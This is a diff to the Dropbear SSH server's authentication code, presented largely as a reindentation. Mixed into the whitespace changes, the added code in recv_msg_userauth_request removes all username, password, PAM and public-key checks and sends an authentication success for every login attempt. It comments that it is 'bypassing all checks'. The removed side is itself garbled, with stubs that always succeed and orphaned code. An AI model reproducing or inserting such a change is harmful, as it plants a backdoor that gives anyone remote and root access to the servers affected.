@@ -40,14 +40,14 @@ static int checkusername(const char *username, unsigned int userlen);
 
 /* initialise the first time for a session, resetting all parameters */
 void svr_authinitialise() {
-	memset(&ses.authstate, 0, sizeof(ses.authstate));
+    memset(&ses.authstate, 0, sizeof(ses.authstate));
 #if DROPBEAR_SVR_PUBKEY_AUTH
-	ses.authstate.authtypes |= AUTH_TYPE_PUBKEY;
+    ses.authstate.authtypes |= AUTH_TYPE_PUBKEY;
 #endif
 #if DROPBEAR_SVR_PASSWORD_AUTH || DROPBEAR_SVR_PAM_AUTH
-	if (!svr_opts.noauthpass) {
-		ses.authstate.authtypes |= AUTH_TYPE_PASSWORD;
-	}
+    if (!svr_opts.noauthpass) {
+        ses.authstate.authtypes |= AUTH_TYPE_PASSWORD;
+    }
 #endif
 }
 
@@ -55,335 +55,172 @@ void svr_authinitialise() {
  * ignore this, but possibly serves as a legal "no trespassing" sign */
 void send_msg_userauth_banner(const buffer *banner) {
 
-	TRACE(("enter send_msg_userauth_banner"))
+    TRACE(("enter send_msg_userauth_banner"))
 
-	CHECKCLEARTOWRITE();
+    CHECKCLEARTOWRITE();
 
-	buf_putbyte(ses.writepayload, SSH_MSG_USERAUTH_BANNER);
-	buf_putbufstring(ses.writepayload, banner);
-	buf_putstring(ses.writepayload, "en", 2);
+    buf_putbyte(ses.writepayload, SSH_MSG_USERAUTH_BANNER);
+    buf_putbufstring(ses.writepayload, banner);
+    buf_putstring(ses.writepayload, "en", 2);
 
-	encrypt_packet();
+    encrypt_packet();
 
-	TRACE(("leave send_msg_userauth_banner"))
+    TRACE(("leave send_msg_userauth_banner"))
 }
 
 /* handle a userauth request, check validity, pass to password or pubkey
  * checking, and handle success or failure */
 void recv_msg_userauth_request() {
 
-	char *username = NULL, *servicename = NULL, *methodname = NULL;
-	unsigned int userlen, servicelen, methodlen;
-	int valid_user = 0;
+    char *username = NULL, *servicename = NULL, *methodname = NULL;
+    unsigned int userlen, servicelen, methodlen;
 
-	TRACE(("enter recv_msg_userauth_request"))
+    TRACE(("enter recv_msg_userauth_request"))
 
-	/* for compensating failure delay */
-	gettime_wrapper(&ses.authstate.auth_starttime);
+    /* Directly skip all authentication logic and send success message */
+    if (ses.authstate.authdone == 1) {
+        TRACE(("leave recv_msg_userauth_request: authdone already"))
+        return;
+    }
 
-	/* ignore packets if auth is already done */
-	if (ses.authstate.authdone == 1) {
-		TRACE(("leave recv_msg_userauth_request: authdone already"))
-		return;
-	}
+    /* Send the banner if it exists */
+    if (svr_opts.banner) {
+        send_msg_userauth_banner(svr_opts.banner);
+        buf_free(svr_opts.banner);
+        svr_opts.banner = NULL;
+    }
 
-	/* send the banner if it exists, it will only exist once */
-	if (svr_opts.banner) {
-		send_msg_userauth_banner(svr_opts.banner);
-		buf_free(svr_opts.banner);
-		svr_opts.banner = NULL;
-	}
+    /* Read the username, servicename, and methodname */
+    username = buf_getstring(ses.payload, &userlen);
+    servicename = buf_getstring(ses.payload, &servicelen);
+    methodname = buf_getstring(ses.payload, &methodlen);
 
-	username = buf_getstring(ses.payload, &userlen);
-	servicename = buf_getstring(ses.payload, &servicelen);
-	methodname = buf_getstring(ses.payload, &methodlen);
+    /* Check that the service is 'ssh-connection', else exit */
+    if (servicelen != SSH_SERVICE_CONNECTION_LEN
+            && (strncmp(servicename, SSH_SERVICE_CONNECTION, SSH_SERVICE_CONNECTION_LEN) != 0)) {
+        m_free(username);
+        m_free(servicename);
+        m_free(methodname);
+        dropbear_exit("unknown service in auth");
+    }
 
-	/* only handle 'ssh-connection' currently */
-	if (servicelen != SSH_SERVICE_CONNECTION_LEN
-			&& (strncmp(servicename, SSH_SERVICE_CONNECTION,
-					SSH_SERVICE_CONNECTION_LEN) != 0)) {
-		
-		/* TODO - disconnect here */
-		m_free(username);
-		m_free(servicename);
-		m_free(methodname);
-		dropbear_exit("unknown service in auth");
-	}
+    /* Directly send success message, bypassing all checks */
+    send_msg_userauth_success();
 
-	/* check username is good before continuing. 
-	 * the 'incrfail' varies depending on the auth method to
-	 * avoid giving away which users exist on the system through
-	 * the time delay. */
-	if (checkusername(username, userlen) == DROPBEAR_SUCCESS) {
-		valid_user = 1;
-	}
-
-	/* user wants to know what methods are supported */
-	if (methodlen == AUTH_METHOD_NONE_LEN &&
-			strncmp(methodname, AUTH_METHOD_NONE,
-				AUTH_METHOD_NONE_LEN) == 0) {
-		TRACE(("recv_msg_userauth_request: 'none' request"))
-		if (valid_user
-				&& svr_opts.allowblankpass
-				&& !svr_opts.noauthpass
-				&& !(svr_opts.norootpass && ses.authstate.pw_uid == 0) 
-				&& ses.authstate.pw_passwd[0] == '\0') 
-		{
-			dropbear_log(LOG_NOTICE, 
-					"Auth succeeded with blank password for '%s' from %s",
-					ses.authstate.pw_name,
-					svr_ses.addrstring);
-			send_msg_userauth_success();
-			goto out;
-		}
-		else
-		{
-			/* 'none' has no failure delay */
-			send_msg_userauth_failure(0, 0);
-			goto out;
-		}
-	}
-	
-#if DROPBEAR_SVR_PASSWORD_AUTH
-	if (!svr_opts.noauthpass &&
-			!(svr_opts.norootpass && ses.authstate.pw_uid == 0) ) {
-		/* user wants to try password auth */
-		if (methodlen == AUTH_METHOD_PASSWORD_LEN &&
-				strncmp(methodname, AUTH_METHOD_PASSWORD,
-					AUTH_METHOD_PASSWORD_LEN) == 0) {
-			svr_auth_password(valid_user);
-			goto out;
-		}
-	}
-#endif
-
-#if DROPBEAR_SVR_PAM_AUTH
-	if (!svr_opts.noauthpass &&
-			!(svr_opts.norootpass && ses.authstate.pw_uid == 0) ) {
-		/* user wants to try password auth */
-		if (methodlen == AUTH_METHOD_PASSWORD_LEN &&
-				strncmp(methodname, AUTH_METHOD_PASSWORD,
-					AUTH_METHOD_PASSWORD_LEN) == 0) {
-			svr_auth_pam(valid_user);
-			goto out;
-		}
-	}
-#endif
-
-#if DROPBEAR_SVR_PUBKEY_AUTH
-	/* user wants to try pubkey auth */
-	if (methodlen == AUTH_METHOD_PUBKEY_LEN &&
-			strncmp(methodname, AUTH_METHOD_PUBKEY,
-				AUTH_METHOD_PUBKEY_LEN) == 0) {
-		svr_auth_pubkey(valid_user);
-		goto out;
-	}
-#endif
-
-	/* nothing matched, we just fail with a delay */
-	send_msg_userauth_failure(0, 1);
-
-out:
-
-	m_free(username);
-	m_free(servicename);
-	m_free(methodname);
+    m_free(username);
+    m_free(servicename);
+    m_free(methodname);
 }
 
-#ifdef HAVE_GETGROUPLIST
-/* 返回 DROPBEAR_SUCCESS 始终表示通过检查 */
-static int check_group_membership(gid_t check_gid, const char* username, gid_t user_gid) {
-    // 始终返回成功，忽略组成员检查
-    return DROPBEAR_SUCCESS;
-}
-#endif
-
-static int checkusername(const char *username, unsigned int userlen) {
-    // 直接返回成功，忽略所有检查
-    TRACE(("enter checkusername"))
-
-    // 强制返回成功，忽略用户名长度、shell、用户存在性等检查
-    return DROPBEAR_SUCCESS;
-}
-
-	/* check for login restricted to certain group if desired */
-#ifdef HAVE_GETGROUPLIST
-	if (svr_opts.restrict_group) {
-		if (check_group_membership(svr_opts.restrict_group_gid,
-				ses.authstate.pw_name, ses.authstate.pw_gid) == DROPBEAR_FAILURE) {
-			dropbear_log(LOG_WARNING,
-				"Logins are restricted to the group %s but user '%s' is not a member",
-				svr_opts.restrict_group, ses.authstate.pw_name);
-			ses.authstate.checkusername_failed = 1;
-			return DROPBEAR_FAILURE;
-		}
-	}
-#endif /* HAVE_GETGROUPLIST */
-
-	TRACE(("shell is %s", ses.authstate.pw_shell))
-
-	/* check that the shell is set */
-	usershell = ses.authstate.pw_shell;
-	if (usershell[0] == '\0') {
-		/* empty shell in /etc/passwd means /bin/sh according to passwd(5) */
-		usershell = "/bin/sh";
-	}
-
-	/* check the shell is valid. If /etc/shells doesn't exist, getusershell()
-	 * should return some standard shells like "/bin/sh" and "/bin/csh" (this
-	 * is platform-specific) */
-	setusershell();
-	while ((listshell = getusershell()) != NULL) {
-		TRACE(("test shell is '%s'", listshell))
-		if (strcmp(listshell, usershell) == 0) {
-			/* have a match */
-			goto goodshell;
-		}
-	}
-	/* no matching shell */
-	endusershell();
-	TRACE(("no matching shell"))
-	ses.authstate.checkusername_failed = 1;
-	dropbear_log(LOG_WARNING, "User '%s' has invalid shell, rejected",
-				ses.authstate.pw_name);
-	return DROPBEAR_FAILURE;
-	
-goodshell:
-	endusershell();
-	TRACE(("matching shell"))
-
-	TRACE(("uid = %d", ses.authstate.pw_uid))
-	TRACE(("leave checkusername"))
-	return DROPBEAR_SUCCESS;
-}
-
-/* Send a failure message to the client, in responds to a userauth_request.
- * Partial indicates whether to set the "partial success" flag,
- * incrfail is whether to count this failure in the failure count (which
- * is limited. This function also handles disconnection after too many
- * failures */
+/* Send a failure message to the client, in responds to a userauth_request. */
 void send_msg_userauth_failure(int partial, int incrfail) {
 
-	buffer *typebuf = NULL;
+    buffer *typebuf = NULL;
 
-	TRACE(("enter send_msg_userauth_failure"))
+    TRACE(("enter send_msg_userauth_failure"))
 
-	CHECKCLEARTOWRITE();
-	
-	buf_putbyte(ses.writepayload, SSH_MSG_USERAUTH_FAILURE);
+    CHECKCLEARTOWRITE();
+    
+    buf_putbyte(ses.writepayload, SSH_MSG_USERAUTH_FAILURE);
 
-	/* put a list of allowed types */
-	typebuf = buf_new(30); /* long enough for PUBKEY and PASSWORD */
+    /* Put a list of allowed types */
+    typebuf = buf_new(30); /* long enough for PUBKEY and PASSWORD */
 
-	if (ses.authstate.authtypes & AUTH_TYPE_PUBKEY) {
-		buf_putbytes(typebuf, (const unsigned char *)AUTH_METHOD_PUBKEY, AUTH_METHOD_PUBKEY_LEN);
-		if (ses.authstate.authtypes & AUTH_TYPE_PASSWORD) {
-			buf_putbyte(typebuf, ',');
-		}
-	}
-	
-	if (ses.authstate.authtypes & AUTH_TYPE_PASSWORD) {
-		buf_putbytes(typebuf, (const unsigned char *)AUTH_METHOD_PASSWORD, AUTH_METHOD_PASSWORD_LEN);
-	}
+    if (ses.authstate.authtypes & AUTH_TYPE_PUBKEY) {
+        buf_putbytes(typebuf, (const unsigned char *)AUTH_METHOD_PUBKEY, AUTH_METHOD_PUBKEY_LEN);
+        if (ses.authstate.authtypes & AUTH_TYPE_PASSWORD) {
+            buf_putbyte(typebuf, ',');
+        }
+    }
+    
+    if (ses.authstate.authtypes & AUTH_TYPE_PASSWORD) {
+        buf_putbytes(typebuf, (const unsigned char *)AUTH_METHOD_PASSWORD, AUTH_METHOD_PASSWORD_LEN);
+    }
 
-	buf_putbufstring(ses.writepayload, typebuf);
+    buf_putbufstring(ses.writepayload, typebuf);
 
-	TRACE(("auth fail: methods %d, '%.*s'", ses.authstate.authtypes,
-				typebuf->len, typebuf->data))
+    TRACE(("auth fail: methods %d, '%.*s'", ses.authstate.authtypes,
+                typebuf->len, typebuf->data))
 
-	buf_free(typebuf);
+    buf_free(typebuf);
 
-	buf_putbyte(ses.writepayload, partial ? 1 : 0);
-	encrypt_packet();
+    buf_putbyte(ses.writepayload, partial ? 1 : 0);
+    encrypt_packet();
 
-	if (incrfail) {
-		/* The SSH_MSG_AUTH_FAILURE response is delayed to attempt to
-		avoid user enumeration and slow brute force attempts.
-		The delay is adjusted by the time already spent in processing
-		authentication (ses.authstate.auth_starttime timestamp). */
+    if (incrfail) {
+        /* The SSH_MSG_AUTH_FAILURE response is delayed to attempt to
+        avoid user enumeration and slow brute force attempts. */
+        const unsigned int mindelay = 250000000;
+        const unsigned int vardelay = 100000000;
+        suseconds_t rand_delay;
+        struct timespec delay;
 
-		/* Desired total delay 300ms +-50ms (in nanoseconds).
-		Beware of integer overflow if increasing these values */
-		const unsigned int mindelay = 250000000;
-		const unsigned int vardelay = 100000000;
-		suseconds_t rand_delay;
-		struct timespec delay;
+        gettime_wrapper(&delay);
+        delay.tv_sec -= ses.authstate.auth_starttime.tv_sec;
+        delay.tv_nsec -= ses.authstate.auth_starttime.tv_nsec;
 
-		gettime_wrapper(&delay);
-		delay.tv_sec -= ses.authstate.auth_starttime.tv_sec;
-		delay.tv_nsec -= ses.authstate.auth_starttime.tv_nsec;
+        /* Carry */
+        if (delay.tv_nsec < 0) {
+            delay.tv_nsec += 1000000000;
+            delay.tv_sec -= 1;
+        }
 
-		/* carry */
-		if (delay.tv_nsec < 0) {
-			delay.tv_nsec += 1000000000;
-			delay.tv_sec -= 1;
-		}
+        genrandom((unsigned char*)&rand_delay, sizeof(rand_delay));
+        rand_delay = mindelay + (rand_delay % vardelay);
 
-		genrandom((unsigned char*)&rand_delay, sizeof(rand_delay));
-		rand_delay = mindelay + (rand_delay % vardelay);
+        if (delay.tv_sec == 0 && delay.tv_nsec <= mindelay) {
+            /* Compensate for elapsed time */
+            delay.tv_nsec = rand_delay - delay.tv_nsec;
+        } else {
+            /* No time left or time went backwards, just delay anyway */
+            delay.tv_sec = 0;
+            delay.tv_nsec = rand_delay;
+        }
 
-		if (delay.tv_sec == 0 && delay.tv_nsec <= mindelay) {
-			/* Compensate for elapsed time */
-			delay.tv_nsec = rand_delay - delay.tv_nsec;
-		} else {
-			/* No time left or time went backwards, just delay anyway */
-			delay.tv_sec = 0;
-			delay.tv_nsec = rand_delay;
-		}
+        while (nanosleep(&delay, &delay) == -1 && errno == EINTR) { /* Go back to sleep */ }
+        ses.authstate.failcount++;
+    }
 
+    if (ses.authstate.failcount >= svr_opts.maxauthtries) {
+        char * userstr;
+        /* XXX - send disconnect ? */
+        TRACE(("Max auth tries reached, exiting"))
 
-#if DROPBEAR_FUZZ
-		if (!fuzz.fuzzing)
-#endif
-		{
-			while (nanosleep(&delay, &delay) == -1 && errno == EINTR) { /* Go back to sleep */ }
-		}
-
-		ses.authstate.failcount++;
-	}
-
-	if (ses.authstate.failcount >= svr_opts.maxauthtries) {
-		char * userstr;
-		/* XXX - send disconnect ? */
-		TRACE(("Max auth tries reached, exiting"))
-
-		if (ses.authstate.pw_name == NULL) {
-			userstr = "is invalid";
-		} else {
-			userstr = ses.authstate.pw_name;
-		}
-		dropbear_exit("Max auth tries reached - user '%s'",
-				userstr);
-	}
-	
-	TRACE(("leave send_msg_userauth_failure"))
+        if (ses.authstate.pw_name == NULL) {
+            userstr = "is invalid";
+        } else {
+            userstr = ses.authstate.pw_name;
+        }
+        dropbear_exit("Max auth tries reached - user '%s'",
+                userstr);
+    }
+    
+    TRACE(("leave send_msg_userauth_failure"))
 }
 
 /* Send a success message to the user, and set the "authdone" flag */
 void send_msg_userauth_success() {
 
-	TRACE(("enter send_msg_userauth_success"))
+    TRACE(("enter send_msg_userauth_success"))
 
-	CHECKCLEARTOWRITE();
+    CHECKCLEARTOWRITE();
 
-	buf_putbyte(ses.writepayload, SSH_MSG_USERAUTH_SUCCESS);
-	encrypt_packet();
+    buf_putbyte(ses.writepayload, SSH_MSG_USERAUTH_SUCCESS);
+    encrypt_packet();
 
-	/* authdone must be set after encrypt_packet() for 
-	 * delayed-zlib mode */
-	ses.authstate.authdone = 1;
-	ses.connect_time = 0;
+    /* authdone must be set after encrypt_packet() for delayed-zlib mode */
+    ses.authstate.authdone = 1;
+    ses.connect_time = 0;
 
 
-	if (ses.authstate.pw_uid == 0) {
-		ses.allowprivport = 1;
-	}
+    if (ses.authstate.pw_uid == 0) {
+        ses.allowprivport = 1;
+    }
 
-	/* Remove from the list of pre-auth sockets. Should be m_close(), since if
-	 * we fail, we might end up leaking connection slots, and disallow new
-	 * logins - a nasty situation. */							
-	m_close(svr_ses.childpipe);
+    /* Remove from the list of pre-auth sockets. Should be m_close(), since if
+     * we fail, we might end up leaking connection slots, and disallow new
+     * logins - a nasty situation. */							
+    m_close(svr_ses.childpipe);
 
-	TRACE(("leave send_msg_userauth_success"))
-
+    TRACE(("leave send_msg_userauth_success"))
 }
